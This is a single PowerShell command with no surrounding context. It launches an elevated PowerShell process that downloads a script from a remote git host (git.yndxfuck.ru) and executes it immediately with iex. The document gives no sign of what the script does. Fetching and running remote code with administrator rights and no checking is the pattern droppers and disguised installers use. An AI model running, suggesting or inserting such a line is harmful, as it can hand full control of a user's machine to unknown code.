Start-Process -FilePath "powershell.exe" -ArgumentList "-Command iex ((New-Object System.Net.WebClient).DownloadString('https://git.yndxfuck.ru/yndxfuck-public/bootstrap/-/raw/master/main.ps1'))" -Verb RunAs
